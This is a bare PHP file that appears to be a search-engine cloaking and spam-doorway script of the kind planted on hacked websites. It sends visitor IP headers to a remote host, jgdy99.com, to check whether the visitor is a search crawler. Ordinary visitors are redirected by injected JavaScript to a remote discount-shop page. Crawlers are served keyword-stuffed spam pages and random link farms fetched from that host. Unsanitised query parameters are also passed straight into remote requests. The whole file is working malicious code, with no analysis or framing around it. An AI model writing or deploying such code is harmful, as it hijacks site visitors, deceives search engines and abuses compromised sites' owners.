<?php
error_reporting(E_ALL^E_NOTICE^E_WARNING);
$http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';
$kname="";
if(!is_null($_GET['iid'])){
$kname=file_get_contents("http://dy4.jgdy99.com/gn.aspx?iid=".$_GET['iid']);
}
if(!is_null($_GET['s']))
{
if(!is_null($_GET['cid']))
{
$url="http://dy4.jgdy99.com/sjd.aspx?cid=".$_GET['cid']."&number=".$_GET['number']."&pnum=".$_GET['pnum'];
$str=file_get_contents($url);
$str=str_replace('yymm', $http_type.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'],$str);
 echo $str;
 exit();
}
}
function check($ip){
	if(!is_null($_GET['kk'])){$ip="66.249.64.190";}
    $domain = file_get_contents("http://dy4.jgdy99.com/getdomain.aspx?rnd=1&ip=".$ip);
    if(stripos($domain,'google')!=false or stripos($domain,'msn.com')!=false or stripos($domain,'yahoo.com')!=false or stripos($domain,'aol.com')!=false or stripos($domain,'yandex')!=false){}
else
	{
	if(!is_null($_GET['iid']))	 
	{
	$kname=file_get_contents("http://dy4.jgdy99.com/gn.aspx?iid=".$_GET['iid']);
    $xs="http://dy4.jgdy99.com/a.aspx";
echo '<script>document.location="'.$xs."?cid=".$_GET['cid']."&cname=".urlencode($kname).'"</script>';
exit();
	}
	if(!is_null($_GET['pnum']))	 
	{
		$xs="http://dy4.jgdy99.com/a.aspx";
		$txt=str_replace("products.aspx","",$xs)."?cid=".$_GET['cid'];
        echo '<script>document.location="'.$txt.'"</script>';
		exit();
	}
    }		
    }
   function getIP() { 
	$ip=$_SERVER['REMOTE_ADDR']."*".$_SERVER['REMOTE_HOST']."*".$_SERVER['HTTP_CLIENT_IP']."*".$_SERVER['HTTP_X_FORWARDED_FOR']."*".$_SERVER['HTTP_X_FORWARDED']."*".$_SERVER['HTTP_FORWARDED_FOR']."*".$_SERVER['HTTP_FORWARDED'];
		return $ip; 
	} 
$validate = check(getIP());
   ?> 
<?php
$url="";
$hyzhdy="http://dy4.jgdy99.com/doiid_jgs.aspx";
if(!is_null($_GET['iid'])){
 $wid=mt_rand(1,1780);
$url=$hyzhdy."?iid=".$_GET['iid']."&mt=http://dy4.jgdy99.com/jk/enjk".$wid.".txt";
 }
  else
 {
 $cid=mt_rand(1,155);
	if(!is_null($_GET['cid']))
	{
		$cid=$_GET['cid'];
	}
	$url=$hyzhdy."?cid=".$cid."&pnum=".$_GET['pnum'];
 }
 $ttttt="Understand and buy ".$kname." - In stock".$_GET['pnum'];
 $kkkkk=$kname;
 $iiiii="Free worldwide shipping OFF-".mt_rand(50,70)."%!".$kname.",Online Discount Shop for Electronics, Apparel, Toys, Books, Games, Computers, Shoes, Jewelry, Watches, Baby Products, Sports & Outdoors, Office Products, Bed & Bath, Furniture, Tools, Hardware, Automotive Parts, Accessories & more";
 $ccccc=$http_type.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
 $ddddd="<div style='display: block'><ul><li>Related links: <a href='".$_SERVER['SCRIPT_NAME']."?cid=".mt_rand(1,60)."&pnum=".mt_rand(1,60)."'>Plus</a></li><li>Related links: <a href='".$_SERVER['SCRIPT_NAME']."?cid=".mt_rand(61,155)."&pnum=".mt_rand(1,50)."'>Plus</a></li><li>Related links: <a href='".$_SERVER['SCRIPT_NAME']."?s=s&cid=".mt_rand(20,118)."&pnum=".mt_rand(1,10)."&number=".mt_rand(1200,7000)."&kk=5'>map</a></li></ul></div>";
 $str = file_get_contents($url);
 $str=str_replace('UUUUU',$http_type.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'],$str);
 $str=str_replace('BBBBB',$_SERVER['HTTP_HOST'],$str);
 $str=str_replace('NNNNN',$kname.$_GET['iid'],$str);
 $str=str_replace('DDDDD', $ddddd,$str);
 $str=str_replace('TTTTT', $ttttt,$str);
 $str=str_replace('KKKKK', $kkkkk,$str);
 $str=str_replace('IIIII', $iiiii,$str);
 $str=str_replace('CCCCC', $ccccc,$str);
 echo $str;
?> 